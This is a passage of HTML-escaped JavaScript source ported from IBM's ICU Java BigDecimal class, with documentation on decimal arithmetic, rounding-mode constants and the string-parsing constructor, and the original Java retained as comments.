lostDigits=false, roundingMode=ROUND_HALF_UP&lt;/code&gt;) * perform general-purpose floating point arithmetic to nine digits of * precision. The &lt;code&gt;MathContext&lt;/code&gt; parameter must not be * &lt;code&gt;null&lt;/code&gt;. * &lt;p&gt; * Each operator method also has a version provided which does * not take a &lt;code&gt;MathContext&lt;/code&gt; parameter. For this version of * each method, the context settings used are &lt;code&gt;digits=0, * form=PLAIN, lostDigits=false, roundingMode=ROUND_HALF_UP&lt;/code&gt;; * these settings perform fixed point arithmetic with unlimited * precision, as defined for the original BigDecimal class in Java 1.1 * and Java 1.2. * &lt;p&gt; * For monadic operators, only the optional &lt;code&gt;MathContext&lt;/code&gt; * parameter is present; the operation acts upon the current object. * &lt;p&gt; * For dyadic operators, a &lt;code&gt;BigDecimal&lt;/code&gt; parameter is always * present; it must not be &lt;code&gt;null&lt;/code&gt;. * The operation acts with the current object being the left-hand operand * and the &lt;code&gt;BigDecimal&lt;/code&gt; parameter being the right-hand operand. * &lt;p&gt; * For example, adding two &lt;code&gt;BigDecimal&lt;/code&gt; objects referred to * by the names &lt;code&gt;award&lt;/code&gt; and &lt;code&gt;extra&lt;/code&gt; could be * written as any of: * &lt;p&gt;&lt;code&gt; * award.add(extra) * &lt;br&gt;award.add(extra, MathContext.DEFAULT) * &lt;br&gt;award.add(extra, acontext) * &lt;/code&gt; * &lt;p&gt; * (where &lt;code&gt;acontext&lt;/code&gt; is a &lt;code&gt;MathContext&lt;/code&gt; object), * which would return a &lt;code&gt;BigDecimal&lt;/code&gt; object whose value is * the result of adding &lt;code&gt;award&lt;/code&gt; and &lt;code&gt;extra&lt;/code&gt; under * the appropriate context settings. * &lt;p&gt; * When a &lt;code&gt;BigDecimal&lt;/code&gt; operator method is used, a set of * rules define what the result will be (and, by implication, how the * result would be represented as a character string). * These rules are defined in the BigDecimal arithmetic documentation * (see the URL above), but in summary: * &lt;ul&gt; * &lt;li&gt;Results are normally calculated with up to some maximum number of * significant digits. * For example, if the &lt;code&gt;MathContext&lt;/code&gt; parameter for an operation * were &lt;code&gt;MathContext.DEFAULT&lt;/code&gt; then the result would be * rounded to 9 digits; the division of 2 by 3 would then result in * 0.666666667. * &lt;br&gt; * You can change the default of 9 significant digits by providing the * method with a suitable &lt;code&gt;MathContext&lt;/code&gt; object. This lets you * calculate using as many digits as you need -- thousands, if necessary. * Fixed point (scaled) arithmetic is indicated by using a * &lt;code&gt;digits&lt;/code&gt; setting of 0 (or omitting the * &lt;code&gt;MathContext&lt;/code&gt; parameter). * &lt;br&gt; * Similarly, you can change the algorithm used for rounding from the * default \"classic\" algorithm. * &lt;li&gt; * In standard arithmetic (that is, when the &lt;code&gt;form&lt;/code&gt; setting * is not &lt;code&gt;PLAIN&lt;/code&gt;), a zero result is always expressed as the * single digit &lt;code&gt;'0'&lt;/code&gt; (that is, with no sign, decimal point, * or exponent part). * &lt;li&gt; * Except for the division and power operators in standard arithmetic, * trailing zeros are preserved (this is in contrast to binary floating * point operations and most electronic calculators, which lose the * information about trailing zeros in the fractional part of results). * &lt;br&gt; * So, for example: * &lt;p&gt;&lt;code&gt; * new BigDecimal(\"2.40\").add( new BigDecimal(\"2\")) =&gt; \"4.40\" * &lt;br&gt;new BigDecimal(\"2.40\").subtract(new BigDecimal(\"2\")) =&gt; \"0.40\" * &lt;br&gt;new BigDecimal(\"2.40\").multiply(new BigDecimal(\"2\")) =&gt; \"4.80\" * &lt;br&gt;new BigDecimal(\"2.40\").divide( new BigDecimal(\"2\"), def) =&gt; \"1.2\" * &lt;/code&gt; * &lt;p&gt;where the value on the right of the &lt;code&gt;=&gt;&lt;/code&gt; would be the * result of the operation, expressed as a &lt;code&gt;String&lt;/code&gt;, and * &lt;code&gt;def&lt;/code&gt; (in this and following examples) refers to * &lt;code&gt;MathContext.DEFAULT&lt;/code&gt;). * This preservation of trailing zeros is desirable for most * calculations (including financial calculations). * If necessary, trailing zeros may be easily removed using division by 1. * &lt;li&gt; * In standard arithmetic, exponential form is used for a result * depending on its value and the current setting of &lt;code&gt;digits&lt;/code&gt; * (the default is 9 digits). * If the number of places needed before the decimal point exceeds the * &lt;code&gt;digits&lt;/code&gt; setting, or the absolute value of the number is * less than &lt;code&gt;0.000001&lt;/code&gt;, then the number will be expressed in * exponential notation; thus * &lt;p&gt;&lt;code&gt; * new BigDecimal(\"1e+6\").multiply(new BigDecimal(\"1e+6\"), def) * &lt;/code&gt; * &lt;p&gt;results in &lt;code&gt;1E+12&lt;/code&gt; instead of * &lt;code&gt;1000000000000&lt;/code&gt;, and * &lt;p&gt;&lt;code&gt; * new BigDecimal(\"1\").divide(new BigDecimal(\"3E+10\"), def) * &lt;/code&gt; * &lt;p&gt;results in &lt;code&gt;3.33333333E-11&lt;/code&gt; instead of * &lt;code&gt;0.0000000000333333333&lt;/code&gt;. * &lt;p&gt; * The form of the exponential notation (scientific or engineering) is * determined by the &lt;code&gt;form&lt;/code&gt; setting. * &lt;eul&gt; * &lt;p&gt; * The names of methods in this class follow the conventions established * by &lt;code&gt;java.lang.Number&lt;/code&gt;, &lt;code&gt;java.math.BigInteger&lt;/code&gt;, * and &lt;code&gt;java.math.BigDecimal&lt;/code&gt; in Java 1.1 and Java 1.2. * * @see MathContext * @author Mike Cowlishaw * @stable ICU 2.0 *///--public class BigDecimal extends java.lang.Number implements java.io.Serializable,java.lang.Comparable&#123;//-- private static final java.lang.String $0=\"BigDecimal.nrx\"; //-- methods BigDecimal.prototype.abs = abs; BigDecimal.prototype.add = add; BigDecimal.prototype.compareTo = compareTo; BigDecimal.prototype.divide = divide; BigDecimal.prototype.divideInteger = divideInteger; BigDecimal.prototype.max = max; BigDecimal.prototype.min = min; BigDecimal.prototype.multiply = multiply; BigDecimal.prototype.negate = negate; BigDecimal.prototype.plus = plus; BigDecimal.prototype.pow = pow; BigDecimal.prototype.remainder = remainder; BigDecimal.prototype.subtract = subtract; BigDecimal.prototype.equals = equals; BigDecimal.prototype.format = format; BigDecimal.prototype.intValueExact = intValueExact; BigDecimal.prototype.movePointLeft = movePointLeft; BigDecimal.prototype.movePointRight = movePointRight; BigDecimal.prototype.scale = scale; BigDecimal.prototype.setScale = setScale; BigDecimal.prototype.signum = signum; BigDecimal.prototype.toString = toString; BigDecimal.prototype.layout = layout; BigDecimal.prototype.intcheck = intcheck; BigDecimal.prototype.dodivide = dodivide; BigDecimal.prototype.bad = bad; BigDecimal.prototype.badarg = badarg; BigDecimal.prototype.extend = extend; BigDecimal.prototype.byteaddsub = byteaddsub; BigDecimal.prototype.diginit = diginit; BigDecimal.prototype.clone = clone; BigDecimal.prototype.checkdigits = checkdigits; BigDecimal.prototype.round = round; BigDecimal.prototype.allzero = allzero; BigDecimal.prototype.finish = finish; // Convenience methods BigDecimal.prototype.isGreaterThan = isGreaterThan; BigDecimal.prototype.isLessThan = isLessThan; BigDecimal.prototype.isGreaterThanOrEqualTo = isGreaterThanOrEqualTo; BigDecimal.prototype.isLessThanOrEqualTo = isLessThanOrEqualTo; BigDecimal.prototype.isPositive = isPositive; BigDecimal.prototype.isNegative = isNegative; BigDecimal.prototype.isZero = isZero; /* ----- Constants ----- */ /* properties constant public */ // useful to others // the rounding modes (copied here for upwards compatibility) /** * Rounding mode to round to a more positive number. * @see MathContext#ROUND_CEILING * @stable ICU 2.0 */ //--public static final int ROUND_CEILING=com.ibm.icu.math.MathContext.ROUND_CEILING; BigDecimal.ROUND_CEILING = BigDecimal.prototype.ROUND_CEILING = MathContext.prototype.ROUND_CEILING; /** * Rounding mode to round towards zero. * @see MathContext#ROUND_DOWN * @stable ICU 2.0 */ //--public static final int ROUND_DOWN=com.ibm.icu.math.MathContext.ROUND_DOWN; BigDecimal.ROUND_DOWN = BigDecimal.prototype.ROUND_DOWN = MathContext.prototype.ROUND_DOWN; /** * Rounding mode to round to a more negative number. * @see MathContext#ROUND_FLOOR * @stable ICU 2.0 */ //--public static final int ROUND_FLOOR=com.ibm.icu.math.MathContext.ROUND_FLOOR; BigDecimal.ROUND_FLOOR = BigDecimal.prototype.ROUND_FLOOR = MathContext.prototype.ROUND_FLOOR; /** * Rounding mode to round to nearest neighbor, where an equidistant * value is rounded down. * @see MathContext#ROUND_HALF_DOWN * @stable ICU 2.0 */ //--public static final int ROUND_HALF_DOWN=com.ibm.icu.math.MathContext.ROUND_HALF_DOWN; BigDecimal.ROUND_HALF_DOWN = BigDecimal.prototype.ROUND_HALF_DOWN = MathContext.prototype.ROUND_HALF_DOWN; /** * Rounding mode to round to nearest neighbor, where an equidistant * value is rounded to the nearest even neighbor. * @see MathContext#ROUND_HALF_EVEN * @stable ICU 2.0 */ //--public static final int ROUND_HALF_EVEN=com.ibm.icu.math.MathContext.ROUND_HALF_EVEN; BigDecimal.ROUND_HALF_EVEN = BigDecimal.prototype.ROUND_HALF_EVEN = MathContext.prototype.ROUND_HALF_EVEN; /** * Rounding mode to round to nearest neighbor, where an equidistant * value is rounded up. * @see MathContext#ROUND_HALF_UP * @stable ICU 2.0 */ //--public static final int ROUND_HALF_UP=com.ibm.icu.math.MathContext.ROUND_HALF_UP; BigDecimal.ROUND_HALF_UP = BigDecimal.prototype.ROUND_HALF_UP = MathContext.prototype.ROUND_HALF_UP; /** * Rounding mode to assert that no rounding is necessary. * @see MathContext#ROUND_UNNECESSARY * @stable ICU 2.0 */ //--public static final int ROUND_UNNECESSARY=com.ibm.icu.math.MathContext.ROUND_UNNECESSARY; BigDecimal.ROUND_UNNECESSARY = BigDecimal.prototype.ROUND_UNNECESSARY = MathContext.prototype.ROUND_UNNECESSARY; /** * Rounding mode to round away from zero. * @see MathContext#ROUND_UP * @stable ICU 2.0 */ //--public static final int ROUND_UP=com.ibm.icu.math.MathContext.ROUND_UP; BigDecimal.ROUND_UP = BigDecimal.prototype.ROUND_UP = MathContext.prototype.ROUND_UP; /* properties constant private */ // locals //--private static final byte ispos=1; // ind: indicates positive (must be 1) //--private static final byte iszero=0; // ind: indicates zero (must be 0) //--private static final byte isneg=-1; // ind: indicates negative (must be -1) BigDecimal.prototype.ispos = 1; BigDecimal.prototype.iszero = 0; BigDecimal.prototype.isneg = -1; // [later could add NaN, +/- infinity, here] //--private static final int MinExp=-999999999; // minimum exponent allowed //--private static final int MaxExp=999999999; // maximum exponent allowed //--private static final int MinArg=-999999999; // minimum argument integer //--private static final int MaxArg=999999999; // maximum argument integer BigDecimal.prototype.MinExp=-999999999; // minimum exponent allowed BigDecimal.prototype.MaxExp=999999999; // maximum exponent allowed BigDecimal.prototype.MinArg=-999999999; // minimum argument integer BigDecimal.prototype.MaxArg=999999999; // maximum argument integer //--private static final com.ibm.icu.math.MathContext plainMC=new com.ibm.icu.math.MathContext(0,com.ibm.icu.math.MathContext.PLAIN); // context for plain unlimited math BigDecimal.prototype.plainMC=new MathContext(0, MathContext.prototype.PLAIN); /* properties constant private unused */ // present but not referenced // Serialization version //--private static final long serialVersionUID=8245355804974198832L; //--private static final java.lang.String copyright=\" Copyright (c) IBM Corporation 1996, 2000. All rights reserved. \"; /* properties static private */ // Precalculated constant arrays (used by byteaddsub) //--private static byte bytecar[]=new byte[(90+99)+1]; // carry/borrow array //--private static byte bytedig[]=diginit(); // next digit array BigDecimal.prototype.bytecar = new Array((90+99)+1); BigDecimal.prototype.bytedig = diginit(); /** * The &lt;code&gt;BigDecimal&lt;/code&gt; constant \"0\". * * @see #ONE * @see #TEN * @stable ICU 2.0 */ //--public static final com.ibm.icu.math.BigDecimal ZERO=new com.ibm.icu.math.BigDecimal((long)0); // use long as we want the int constructor // .. to be able to use this, for speedBigDecimal.ZERO = BigDecimal.prototype.ZERO = new BigDecimal(\"0\"); /** * The &lt;code&gt;BigDecimal&lt;/code&gt; constant \"1\". * * @see #TEN * @see #ZERO * @stable ICU 2.0 */ //--public static final com.ibm.icu.math.BigDecimal ONE=new com.ibm.icu.math.BigDecimal((long)1); // use long as we want the int constructor // .. to be able to use this, for speedBigDecimal.ONE = BigDecimal.prototype.ONE = new BigDecimal(\"1\"); /** * The &lt;code&gt;BigDecimal&lt;/code&gt; constant \"10\". * * @see #ONE * @see #ZERO * @stable ICU 2.0 */ //--public static final com.ibm.icu.math.BigDecimal TEN=new com.ibm.icu.math.BigDecimal(10); BigDecimal.TEN = BigDecimal.prototype.TEN = new BigDecimal(\"10\"); /* ----- Instance properties [all private and immutable] ----- */ /* properties private */ /** * The indicator. This may take the values: * &lt;ul&gt; * &lt;li&gt;ispos -- the number is positive * &lt;li&gt;iszero -- the number is zero * &lt;li&gt;isneg -- the number is negative * &lt;/ul&gt; * * @serial */ //--private byte ind; // assumed undefined // Note: some code below assumes IND = Sign [-1, 0, 1], at present. // We only need two bits for this, but use a byte [also permits // smooth future extension]. /** * The formatting style. This may take the values: * &lt;ul&gt; * &lt;li&gt;MathContext.PLAIN -- no exponent needed * &lt;li&gt;MathContext.SCIENTIFIC -- scientific notation required * &lt;li&gt;MathContext.ENGINEERING -- engineering notation required * &lt;/ul&gt; * &lt;p&gt; * This property is an optimization; it allows us to defer number * layout until it is actually needed as a string, hence avoiding * unnecessary formatting. * * @serial */ //--private byte form=(byte)com.ibm.icu.math.MathContext.PLAIN; // assumed PLAIN // We only need two bits for this, at present, but use a byte // [again, to allow for smooth future extension] /** * The value of the mantissa. * &lt;p&gt; * Once constructed, this may become shared between several BigDecimal * objects, so must not be altered. * &lt;p&gt; * For efficiency (speed), this is a byte array, with each byte * taking a value of 0 -&gt; 9. * &lt;p&gt; * If the first byte is 0 then the value of the number is zero (and * mant.length=1, except when constructed from a plain number, for * example, 0.000). * * @serial */ //--private byte mant[]; // assumed null /** * The exponent. * &lt;p&gt; * For fixed point arithmetic, scale is &lt;code&gt;-exp&lt;/code&gt;, and can * apply to zero. * * Note that this property can have a value less than MinExp when * the mantissa has more than one digit. * * @serial */ //--private int exp; // assumed 0 /* ---------------------------------------------------------------- */ /* Constructors */ /* ---------------------------------------------------------------- */ /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a * &lt;code&gt;java.math.BigDecimal&lt;/code&gt;. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; as though the parameter had * been represented as a &lt;code&gt;String&lt;/code&gt; (using its * &lt;code&gt;toString&lt;/code&gt; method) and the * &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then been * used. * The parameter must not be &lt;code&gt;null&lt;/code&gt;. * &lt;p&gt; * &lt;i&gt;(Note: this constructor is provided only in the * &lt;code&gt;com.ibm.icu.math&lt;/code&gt; version of the BigDecimal class. * It would not be present in a &lt;code&gt;java.math&lt;/code&gt; version.)&lt;/i&gt; * * @param bd The &lt;code&gt;BigDecimal&lt;/code&gt; to be translated. * @stable ICU 2.0 */ //--public BigDecimal(java.math.BigDecimal bd)&#123; //-- this(bd.toString()); //-- return;&#125; /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a * &lt;code&gt;BigInteger&lt;/code&gt;, with scale 0. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal * representation of the &lt;code&gt;BigInteger&lt;/code&gt;, with a scale of * zero. * The value of the &lt;code&gt;BigDecimal&lt;/code&gt; is identical to the value * of the &lt;code&gt;BigInteger&lt;/code&gt;. * The parameter must not be &lt;code&gt;null&lt;/code&gt;. * &lt;p&gt; * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits, * prefixed with a leading minus sign (hyphen) if the * &lt;code&gt;BigInteger&lt;/code&gt; is negative. A leading zero will be * present only if the &lt;code&gt;BigInteger&lt;/code&gt; is zero. * * @param bi The &lt;code&gt;BigInteger&lt;/code&gt; to be converted. * @stable ICU 2.0 */ //--public BigDecimal(java.math.BigInteger bi)&#123; //-- this(bi.toString(10)); //-- return;&#125; // exp remains 0 /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a * &lt;code&gt;BigInteger&lt;/code&gt; and a scale. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal * representation of the &lt;code&gt;BigInteger&lt;/code&gt;, scaled by the * second parameter, which may not be negative. * The value of the &lt;code&gt;BigDecimal&lt;/code&gt; is the * &lt;code&gt;BigInteger&lt;/code&gt; divided by ten to the power of the scale. * The &lt;code&gt;BigInteger&lt;/code&gt; parameter must not be * &lt;code&gt;null&lt;/code&gt;. * &lt;p&gt; * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits, (with * an embedded decimal point followed by &lt;code&gt;scale&lt;/code&gt; decimal * digits if the scale is positive), prefixed with a leading minus * sign (hyphen) if the &lt;code&gt;BigInteger&lt;/code&gt; is negative. A * leading zero will be present only if the &lt;code&gt;BigInteger&lt;/code&gt; is * zero. * * @param bi The &lt;code&gt;BigInteger&lt;/code&gt; to be converted. * @param scale The &lt;code&gt;int&lt;/code&gt; specifying the scale. * @throws NumberFormatException if the scale is negative. * @stable ICU 2.0 */ //--public BigDecimal(java.math.BigInteger bi,int scale)&#123; //-- this(bi.toString(10)); //-- if (scale&lt;0) //-- throw new java.lang.NumberFormatException(\"Negative scale:\"+\" \"+scale); //-- exp=(int)-scale; // exponent is -scale //-- return;&#125; /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from an array of characters. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; as though a * &lt;code&gt;String&lt;/code&gt; had been constructed from the character array * and the &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then * been used. The parameter must not be &lt;code&gt;null&lt;/code&gt;. * &lt;p&gt; * Using this constructor is faster than using the * &lt;code&gt;BigDecimal(String)&lt;/code&gt; constructor if the string is * already available in character array form. * * @param inchars The &lt;code&gt;char[]&lt;/code&gt; array containing the number * to be converted. * @throws NumberFormatException if the parameter is not a valid * number. * @stable ICU 2.0 */ //--public BigDecimal(char inchars[])&#123; //-- this(inchars,0,inchars.length); //-- return;&#125; /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from an array of characters. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; as though a * &lt;code&gt;String&lt;/code&gt; had been constructed from the character array * (or a subarray of that array) and the * &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then been * used. The first parameter must not be &lt;code&gt;null&lt;/code&gt;, and the * subarray must be wholly contained within it. * &lt;p&gt; * Using this constructor is faster than using the * &lt;code&gt;BigDecimal(String)&lt;/code&gt; constructor if the string is * already available within a character array. * * @param inchars The &lt;code&gt;char[]&lt;/code&gt; array containing the number * to be converted. * @param offset The &lt;code&gt;int&lt;/code&gt; offset into the array of the * start of the number to be converted. * @param length The &lt;code&gt;int&lt;/code&gt; length of the number. * @throws NumberFormatException if the parameter is not a valid * number for any reason. * @stable ICU 2.0 */ //--public BigDecimal(char inchars[],int offset,int length)&#123;super(); function BigDecimal() &#123; //-- members this.ind = 0; this.form = MathContext.prototype.PLAIN; this.mant = null; this.exp = 0; //-- overloaded ctor if (BigDecimal.arguments.length == 0) return; var inchars; var offset; var length; if (BigDecimal.arguments.length == 1) &#123; inchars = BigDecimal.arguments[0]; offset = 0; length = inchars.length; &#125; else &#123; inchars = BigDecimal.arguments[0]; offset = BigDecimal.arguments[1]; length = BigDecimal.arguments[2]; &#125; if (typeof inchars == \"string\") &#123; inchars = inchars.split(\"\"); &#125; //--boolean exotic; var exotic; //--boolean hadexp; var hadexp; //--int d; var d; //--int dotoff; var dotoff; //--int last; var last; //--int i=0; var i=0; //--char si=0; var si=0; //--boolean eneg=false; var eneg=false; //--int k=0; var k=0; //--int elen=0; var elen=0; //--int j=0; var j=0; //--char sj=0; var sj=0; //--int dvalue=0; var dvalue=0; //--int mag=0; var mag=0; // This is the primary constructor; all incoming strings end up // here; it uses explicit (inline) parsing for speed and to avoid // generating intermediate (temporary) objects of any kind. // 1998.06.25: exponent form built only if E/e in string // 1998.06.25: trailing zeros not removed for zero // 1999.03.06: no embedded blanks; allow offset and length if (length&lt;=0) this.bad(\"BigDecimal(): \", inchars); // bad conversion (empty string) // [bad offset will raise array bounds exception] /* Handle and step past sign */ this.ind=this.ispos; // assume positive if (inchars[0]==('-')) &#123; length--; if (length==0) this.bad(\"BigDecimal(): \", inchars); // nothing after sign this.ind=this.isneg; offset++; &#125; else if (inchars[0]==('+')) &#123; length--; if (length==0) this.bad(\"BigDecimal(): \", inchars); // nothing after sign offset++; &#125; /* We're at the start of the number */ exotic=false; // have extra digits hadexp=false; // had explicit exponent d=0; // count of digits found dotoff=-1; // offset where dot was found last=-1; // last character of mantissa &#123;var $1=length;i=offset;i:for(;$1&gt;0;$1--,i++)&#123; si=inchars[i]; if (si&gt;='0') // test for Arabic digit if (si&lt;='9') &#123; last=i; d++; // still in mantissa continue i; &#125; if (si=='.') &#123; // record and ignore if (dotoff&gt;=0) this.bad(\"BigDecimal(): \", inchars); // two dots dotoff=i-offset; // offset into mantissa continue i; &#125; if (si!='e') if (si!='E') &#123; // expect an extra digit if (si&lt;'0' || si&gt;'9') this.bad(\"BigDecimal(): \", inchars); // not a number // defer the base 10 check until later to avoid extra method call exotic=true; // will need conversion later last=i; d++; // still in mantissa continue i; &#125; /* Found 'e' or 'E' -- now process explicit exponent */ // 1998.07.11: sign no longer required if ((i-offset)&gt;(length-2)) this.bad(\"BigDecimal(): \", inchars); // no room for even one digit eneg=false; if ((inchars[i+1])==('-')) &#123; eneg=true; k=i+2; &#125; else if ((inchars[i+1])==('+')) k=i+2; else k=i+1; // k is offset of first expected digit elen=length-((k-offset)); // possible number of digits if ((elen==0)||(elen&gt;9)) this.bad(\"BigDecimal(): \", inchars); // 0 or more than 9 digits &#123;var $2=elen;j=k;j:for(;$2&gt;0;$2--,j++)&#123; sj=inchars[j]; if (sj&lt;'0') this.bad(\"BigDecimal(): \", inchars); // always bad if (sj&gt;'9') &#123; // maybe an exotic digit /*if (si&lt;'0' || si&gt;'9') this.bad(inchars); // not a number dvalue=java.lang.Character.digit(sj,10); // check base if (dvalue&lt;0) bad(inchars); // not base 10*/ this.bad(\"BigDecimal(): \", inchars); &#125; else dvalue=sj-'0'; this.exp=(this.exp*10)+dvalue; &#125; &#125;/*j*/ if (eneg) this.exp=-this.exp; // was negative hadexp=true; // remember we had one break i; // we are done &#125; &#125;/*i*/ /* Here when all inspected */ if (d==0) this.bad(\"BigDecimal(): \", inchars); // no mantissa digits if (dotoff&gt;=0) this.exp=(this.exp+dotoff)-d; // adjust exponent if had dot /* strip leading zeros/dot (leave final if all 0's) */ &#123;var $3=last-1;i=offset;i:for(;i&lt;=$3;i++)&#123; si=inchars[i]; if (si=='0') &#123; offset++; dotoff--; d--; &#125; else if (si=='.') &#123; offset++; // step past dot dotoff--; &#125; else if (si&lt;='9') break i;/* non-0 */ else &#123;/* exotic */ //if ((java.lang.Character.digit(si,10))!=0) break i; // non-0 or bad // is 0 .. strip like '0' //offset++; //dotoff--; //d--; &#125; &#125; &#125;/*i*/ /* Create the mantissa array */ this.mant=new Array(d); // we know the length j=offset; // input offset if (exotic) &#123;exotica:do&#123; // slow: check for exotica &#123;var $4=d;i=0;i:for(;$4&gt;0;$4--,i++)&#123; if (i==dotoff) j++; // at dot sj=inchars[j]; if (sj&lt;='9') this.mant[i]=sj-'0';/* easy */ else &#123; //dvalue=java.lang.Character.digit(sj,10); //if (dvalue&lt;0) this.bad(\"BigDecimal(): \", inchars); // not a number after all //mant[i]=(byte)dvalue; &#125; j++; &#125; &#125;/*i*/ &#125;while(false);&#125;/*exotica*/ else &#123;simple:do&#123; &#123;var $5=d;i=0;i:for(;$5&gt;0;$5--,i++)&#123; if (i==dotoff) j++; this.mant[i]=inchars[j]-'0'; j++; &#125; &#125;/*i*/ &#125;while(false);&#125;/*simple*/ /* Looks good. Set the sign indicator and form, as needed. */ // Trailing zeros are preserved // The rule here for form is: // If no E-notation, then request plain notation // Otherwise act as though add(0,DEFAULT) and request scientific notation // [form is already PLAIN] if (this.mant[0]==0) &#123; this.ind=this.iszero; // force to show zero // negative exponent is significant (e.g., -3 for 0.000) if plain if (this.exp&gt;0) this.exp=0; // positive exponent can be ignored if (hadexp) &#123; // zero becomes single digit from add this.mant=this.ZERO.mant; this.exp=0; &#125; &#125; else &#123; // non-zero // [ind was set earlier] // now determine form if (hadexp) &#123; this.form=MathContext.prototype.SCIENTIFIC; // 1999.06.29 check for overflow mag=(this.exp+this.mant.length)-1; // true exponent in scientific notation if ((mag&lt;this.MinExp)||(mag&gt;this.MaxExp)) this.bad(\"BigDecimal(): \", inchars); &#125; &#125; // say 'BD(c[]): mant[0] mantlen exp ind form:' mant[0] mant.length exp ind form return; &#125; /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object directly from a * &lt;code&gt;double&lt;/code&gt;. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal * representation of the 64-bit signed binary floating point * parameter. * &lt;p&gt; * Note that this constructor it an exact conversion; it does not give * the same result as converting &lt;code&gt;num&lt;/code&gt; to a * &lt;code&gt;String&lt;/code&gt; using the &lt;code&gt;Double.toString()&lt;/code&gt; method * and then using the &#123;@link #BigDecimal(java.lang.String)&#125; * constructor. * To get that result, use the static &#123;@link #valueOf(double)&#125; * method to construct a &lt;code&gt;BigDecimal&lt;/code&gt; from a * &lt;code&gt;double&lt;/code&gt;. * * @param num The &lt;code&gt;double&lt;/code&gt; to be converted. * @throws NumberFormatException if the parameter is infinite or * not a number. * @stable ICU 2.0 */ //--public BigDecimal(double num)&#123; //-- // 1999.03.06: use exactly the old algorithm //-- // 2000.01.01: note that this constructor does give an exact result, //-- // so perhaps it should not be deprecated //-- // 2000.06.18: no longer deprecated //-- this((new java.math.BigDecimal(num)).toString()); //-- return;&#125; /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object directly from a * &lt;code&gt;int&lt;/code&gt;. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal * representation of the 32-bit signed binary integer parameter. * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits, * prefixed with a leading minus sign (hyphen) if the parameter is * negative. * A leading zero will be present only if the parameter is zero. * * @param num The &lt;code&gt;int&lt;/code&gt; to be converted. * @stable ICU 2.0 */ //--public BigDecimal(int num)&#123;super(); //-- int mun; //-- int i=0; //-- // We fastpath commoners //-- if (num&lt;=9) //-- if (num&gt;=(-9)) //-- &#123;singledigit:do&#123; //-- // very common single digit case //-- &#123;/*select*/ //-- if (num==0) //-- &#123; //-- mant=ZERO.mant; //-- ind=iszero; //-- &#125; //-- else if (num==1) //-- &#123; //-- mant=ONE.mant; //-- ind=ispos; //-- &#125; //-- else if (num==(-1)) //-- &#123; //-- mant=ONE.mant; //-- ind=isneg; //-- &#125; //-- else&#123; //-- &#123; //-- mant=new byte[1]; //-- if (num&gt;0) //-- &#123; //-- mant[0]=(byte)num; //-- ind=ispos; //-- &#125; //-- else //-- &#123; // num&lt;-1 //-- mant[0]=(byte)((int)-num); //-- ind=isneg; //-- &#125; //-- &#125; //-- &#125; //-- &#125; //-- return; //-- &#125;while(false);&#125;/*singledigit*/ //-- //-- /* We work on negative numbers so we handle the most negative number */ //-- if (num&gt;0) //-- &#123; //-- ind=ispos; //-- num=(int)-num; //-- &#125; //-- else //-- ind=isneg;/* negative */ // [0 case already handled] //-- // [it is quicker, here, to pre-calculate the length with //-- // one loop, then allocate exactly the right length of byte array, //-- // then re-fill it with another loop] //-- mun=num; // working copy //-- &#123;i=9;i:for(;;i--)&#123; //-- mun=mun/10; //-- if (mun==0) //-- break i; //-- &#125; //-- &#125;/*i*/ //-- // i is the position of the leftmost digit placed //-- mant=new byte[10-i]; //-- &#123;i=(10-i)-1;i:for(;;i--)&#123; //-- mant[i]=(byte)-(((byte)(num%10))); //-- num=num/10; //-- if (num==0) //-- break i; //-- &#125; //-- &#125;/*i*/ //-- return; //-- &#125; /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object directly from a * &lt;code&gt;long&lt;/code&gt;. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal * representation of the 64-bit signed binary integer parameter. * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits, * prefixed with a leading minus sign (hyphen) if the parameter is * negative. * A leading zero will be present only if the parameter is zero. * * @param num The &lt;code&gt;long&lt;/code&gt; to be converted. * @stable ICU 2.0 */ //--public BigDecimal(long num)&#123;super(); //-- long mun; //-- int i=0; //-- // Not really worth fastpathing commoners in this constructor [also, //-- // we use this to construct the static constants]. //-- // This is much faster than: this(String.valueOf(num).toCharArray()) //-- /* We work on negative num so we handle the most negative number */ //-- if (num&gt;0) //-- &#123; //-- ind=ispos; //-- num=(long)-num; //-- &#125; //-- else //-- if (num==0) //-- ind=iszero; //-- else //-- ind=isneg;/* negative */ //-- mun=num; //-- &#123;i=18;i:for(;;i--)&#123; //-- mun=mun/10; //-- if (mun==0) //-- break i; //-- &#125; //-- &#125;/*i*/ //-- // i is the position of the leftmost digit placed //-- mant=new byte[19-i]; //-- &#123;i=(19-i)-1;i:for(;;i--)&#123; //-- mant[i]=(byte)-(((byte)(num%10))); //-- num=num/10; //-- if (num==0) //-- break i; //-- &#125; //-- &#125;/*i*/ //-- return; //-- &#125; /** * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a &lt;code&gt;String&lt;/code&gt;. * &lt;p&gt; * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; from the parameter, which must * not be &lt;code&gt;null&lt;/code&gt; and must represent a valid &lt;i&gt;number&lt;/i&gt;, * as described formally in the documentation referred to * &#123;@link BigDecimal above&#125;. * &lt;p&gt; * In summary, numbers in 